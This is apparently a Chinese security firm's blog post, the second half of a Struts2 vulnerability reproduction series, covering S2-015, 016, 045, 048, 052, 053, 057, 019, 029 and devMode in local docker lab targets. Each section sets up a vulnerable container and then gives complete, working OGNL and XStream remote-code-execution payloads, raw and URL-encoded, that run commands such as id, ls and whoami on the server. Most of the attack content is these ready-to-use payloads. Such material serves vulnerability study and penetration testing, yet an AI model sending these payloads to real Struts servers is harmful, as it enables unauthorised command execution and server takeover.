Apache Struts2 是一个基于MVC设计模式的Web应用框架，会对某些标签属性（比如
id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。

专注于漏洞攻防的华云安集结了堪称史上最全的Struts2 漏洞复现合集，共17个。近期已经分享了合集上部（传送门[史上最全Struts 2
漏洞复现合集（上）](https://zhuanlan.zhihu.com/p/183876381)）今天和大家分享下部。

##  **一、S2-015复现**

原理：如果一个请求与任何其他定义的操作不匹配，它将被匹配*，并且所请求的操作名称将用于以操作名称加载JSP文件。并且，1作为OGNL表达式的威胁值，{
}可以在服务器端执行任意的Java代码。这个漏洞是两个问题的组合：

  * 请求的操作名称未被转义或再次检查白名单
  * 在TextParseUtil.translateVariables使用组合$和%开放字符时对OGNL表达式进行双重评。

影响版本：Struts 2.0.0 - 2.3.14.2

复现步骤：

1.进入到015的环境目录下并启动环境

命令：cd ../s2-015

命令：docker-compose up -d

![v2-0146df7ca251069f0bae557dda904c1f_1440w.jpg](https://image.3001.net/images/20200817/1597653620.jpg!small)

2\.
访问靶机[http://192.168.100.244:8080](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080)

![v2-974967e090361e918645310c944df47b_1440w.png](https://image.3001.net/images/20200817/1597653621.png!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

    
    
    ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}

注：这里直接使用是没有用的需要进行url编码才能使用

    
    
    %24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action

![v2-8527d04533cf93479386ad9bfd6a0260_1440w.jpg](https://image.3001.net/images/20200817/1597653621.jpg!small)![v2-a076ae1e6e85e054e1e5e4b8300914ac_1440w.jpg](https://image.3001.net/images/20200817/1597653621.jpg!small)

Poc2：

    
    
    ${#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q}.action。

url编码之后：

    
    
    %24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action

![v2-a4dfae7bb81b73ab29b9ed163ebe0af2_1440w.jpg](https://image.3001.net/images/20200817/1597653623.jpg!small)![preview](https://image.3001.net/images/20200818/1597743269.jpg!small)

##  **二、S2-016复现**

原理：问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行。

影响版本：Struts 2.0.0 – 2.3.15

复现步骤：

1.进入到016的环境目录下并启动环境

命令：cd ../s2-016

命令：docker-compose up -d

![v2-4182ecb06cda4d9370d3b8697d006a70_1440w.png](https://image.3001.net/images/20200817/1597653624.png!small)

2\.
访问靶机[http://192.168.100.244:8080](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080)

![v2-4ccb568e3d77bd8ed35c3479ef914144_1440w.jpg](https://image.3001.net/images/20200817/1597653624.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

    
    
    index.action?redirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d

![v2-b0f9ef5925507a1825d7db4b4208effc_1440w.jpg](https://image.3001.net/images/20200817/1597653625.jpg!small)![v2-a8607b2eeccbfc724a5cf84609b0184a_1440w.jpg](https://image.3001.net/images/20200817/1597653626.jpg!small)

##  **三、S2-045复现**

原理：在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

影响版本：

  * Struts2.3.5 – 2.3.31
  * Struts2.5 – 2.5.10

复现步骤：

1.进入到045的环境目录下并启动环境

命令：cd ../s2-045

命令：docker-compose up -d

![v2-bb233bfeb0bd95439bc8507c358a7cf2_1440w.jpg](https://image.3001.net/images/20200817/1597653626.jpg!small)

2\.
访问靶机[http://192.168.100.244:8080/doUpload.action](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/doUpload.action)

![v2-ce28f91f8a727a764a2c99980879a8fd_1440w.jpg](https://image.3001.net/images/20200817/1597653627.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

    
    
    %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*5000)).(#ros.flush())}

![v2-fac8241d109713ce1244a1d2656fcd27_1440w.jpg](https://image.3001.net/images/20200817/1597653628.jpg!small)

##  **四、S2-048复现**

原理：Apache Struts 1插件的Apache Struts
2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限

影响版本：Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本

复现步骤

1.进入到048的环境目录下并启动环境

命令：cd ../s2-048

命令：docker-compose up -d

![v2-c45a682937d30f0fa93bc5dd3222ecfa_1440w.jpg](https://image.3001.net/images/20200817/1597653629.jpg!small)

2\.
访问靶机[http://192.168.100.244:8080/integration/editGangster.action](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/integration/editGangster.action)

![preview](https://image.3001.net/images/20200818/1597743270.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc1：

    
    
    %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}

![v2-43152e97dfc5aa506e26abe84ec5d21d_1440w.jpg](https://image.3001.net/images/20200817/1597653629.jpg!small)![v2-7259546500721540d6883aeb30552484_1440w.jpg](https://image.3001.net/images/20200817/1597653630.jpg!small)

Poc2：

    
    
    name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29.%28%23q%29%7D

![v2-22e8ba9672fbf6c8d518f048109a3c4f_1440w.jpg](https://image.3001.net/images/20200817/1597653630.jpg!small)

##  **五、S2-052复现**

原理：Struts2
REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。

影响版本：

  * Struts 2.1.2 - Struts 2.3.33
  * Struts 2.5 - Struts 2.5.12

复现步骤：

1.进入到052的环境目录下并启动环境

命令：cd ../s2-052

命令：docker-compose up -d

![v2-1ff5d932a5265b8eb7fe6d43cb98fcd3_1440w.jpg](https://image.3001.net/images/20200817/1597653631.jpg!small)

2\.
访问靶机[http://192.168.100.244:8080](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080)

![v2-c9db2471b3462ebc9b78bf64088fa93b_1440w.jpg](https://image.3001.net/images/20200817/1597653632.jpg!small)

点击edit进入到[http://192.168.100.244:8080/orders/3/edit](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/orders/3/edit)页面下，点击一下submit

![v2-b850c978c58b0d65180a1143f6155e6c_1440w.jpg](https://image.3001.net/images/20200817/1597653632.jpg!small)![v2-823277bc5fa170b968631b9573160839_1440w.jpg](https://image.3001.net/images/20200817/1597653633.jpg!small)

3.构造poc, 使用抓包工具burp suite，修改数据包插入poc

Poc：

    
    
    <map>
    <entry>
    
         <jdk.nashorn.internal.objects.NativeString>
    
           <flags>0</flags>
    
           <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
    
             <dataHandler>
    
               <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
    
                 <is class="javax.crypto.CipherInputStream">
    
                   <cipher class="javax.crypto.NullCipher">
    
                     <initialized>false</initialized>
    
                     <opmode>0</opmode>
    
                     <serviceIterator class="javax.imageio.spi.FilterIterator">
    
                       <iter class="javax.imageio.spi.FilterIterator">
    
                         <iter class="java.util.Collections$EmptyIterator"/>
    
                         <next class="java.lang.ProcessBuilder">
    
                           <command>
    
    <string>touch</string>
    
    <string>/tmp/test.txt</string>
    
                           </command>
    
                           <redirectErrorStream>false</redirectErrorStream>
    
                         </next>
    
                       </iter>
    
                       <filter class="javax.imageio.ImageIO$ContainsFilter">
    
                         <method>
    
                           <class>java.lang.ProcessBuilder</class>
    
                           <name>start</name>
    
                           <parameter-types/>
    
                         </method>
    
                         <name>foo</name>
    
                       </filter>
    
                       <next>foo</next>
    
                     </serviceIterator>
    
                     <lock/>
    
                   </cipher>
    
                   <input class="java.lang.ProcessBuilder$NullInputStream"/>
    
                   <ibuffer/>
    
                   <done>false</done>
    
                   <ostart>0</ostart>
    
                   <ofinish>0</ofinish>
    
                   <closed>false</closed>
    
                 </is>
    
                 <consumed>false</consumed>
    
               </dataSource>
    
               <transferFlavors/>
    
             </dataHandler>
    
             <dataLen>0</dataLen>
    
           </value>
    
         </jdk.nashorn.internal.objects.NativeString>
    
         <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    
       </entry>
    
       <entry>
    
         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    
         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    
       </entry>
    
     </map>

![preview](https://image.3001.net/images/20200818/1597743270.jpg!small)

3.执行docker-compose exec struts2 ls /tmp/ 查看命令是否执行成功

![v2-d1f9486fcd98d8f8197724cb344edb90_1440w.png](https://image.3001.net/images/20200817/1597653634.png!small)

##  **六、S2-053复现**

原理：Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

影响版本：

  * Struts 2.0.1-2.3.33
  * Struts 2.5-2.5.10

复现步骤：

1.进入到053的环境目录下并启动环境

命令：cd ../s2-053

命令：docker-compose up -d

![preview](https://image.3001.net/images/20200818/1597743271.jpg!small)

2.访问靶机[http://192.168.100.244:8080/hello](https://link.zhihu.com/?target=http%3A//192.168.100.244%3A8080/hello)

![v2-7f2dca7f37facb0f8de867de08ae2abc_1440w.jpg](https://image.3001.net/images/20200817/1597653634.jpg!small)

3.构造poc, 使用抓包工具burp suite，修改数据包插入poc

Poc：

    
    
    redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A

![v2-9ede98d4b45211321ddb0ced980e2865_1440w.jpg](https://image.3001.net/images/20200817/1597653634.jpg!small)

##  **七、S2-057复现**

原理：

  * -alwaysSelectFullNamespace为true。
  * -action元素没有设置namespace属性，或者使用了通配符。
  * 命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞

影响版本：

  * Struts 2.3–2.3.34
  * Struts2.5–2.5.16

复现步骤：

1.进入到057的环境目录下并启动环境

命令：cd ../s2-057

命令：docker-compose up -d

![v2-eb90324dd1a2371a3a9ee5c1a11b315f_1440w.png](https://image.3001.net/images/20200817/1597653635.png!small)

2.访问靶机192.168.100.244:8080/index

![v2-6e34a4acaf7f9568ca0e3f22f4c4e455_1440w.jpg](https://image.3001.net/images/20200817/1597653635.jpg!small)

3.构造poc，使用抓包工具burp suite，修改数据包插入poc

Poc：

    
    
    /index/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action

![v2-3006a7248836df7eaa6f11a452e0dbe6_1440w.jpg](https://image.3001.net/images/20200817/1597653636.jpg!small)

##  **八、S2-019复现**

原理：要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中

影响版本：Struts 2.0.0 - 2.3.15.1

复现步骤：

1、拉取漏洞环境镜像到本地

命令：docker pull medicean/vulapps:s_struts2_s2-019

![v2-374dc49db167fef835c848832d6d1ac7_1440w.jpg](https://image.3001.net/images/20200817/1597653636.jpg!small)

2、启动漏洞环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-019

![v2-5fc1200753695cf799ae804ec2109d35_1440w.png](https://image.3001.net/images/20200817/1597653637.png!small)

3、访问192.168.50.118:8080

![v2-d140b9285130ebff47db5102d405f5d9_1440w.jpg](https://image.3001.net/images/20200817/1597653637.jpg!small)

4、poc 利用

    
    
    ?debug=command&expression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()

注：利用时需对poc进行url编码

![v2-dcf13f4f49f0f06ccbacc17475397194_1440w.jpg](https://image.3001.net/images/20200817/1597653638.jpg!small)

原理：Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。

在Struts2中，如下的标签就调用了OGNL进行取值。

<p>parameters: <s:property value="#parameters.msg" /></p>

Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。

影响版本：Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）

复现步骤：

1\. 拉取漏洞环境镜像到本地

命令：docker pull medicean/vulapps:s_struts2_s2-029

2\. 启动环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-029

3\. 访问192.168.50.118:8080/default.action

![v2-fc0a699881e2f46a3b1f310321ddc3bc_1440w.jpg](https://image.3001.net/images/20200817/1597653639.jpg!small)

4.Poc利用

    
    
    (%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))

##  **十、S2-devMode 复现**

原理：当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService
启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。

影响版本：当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。

复现步骤：

1\. 拉取漏洞环境到本地

命令：docker pull medicean/vulapps:s_struts2_s2-devmode

2\. 启动漏洞环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-devmode

3\. 访问漏洞环境192.168.0.110

![preview](https://image.3001.net/images/20200818/1597743272.jpg!small)

4\. Poc利用

    
    
    debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id

![v2-cc4ac348cee25021d05eb9eb968fae4b_1440w.jpg](https://image.3001.net/images/20200817/1597653640.jpg!small)

注：修改参数 command 的值为要执行的命令

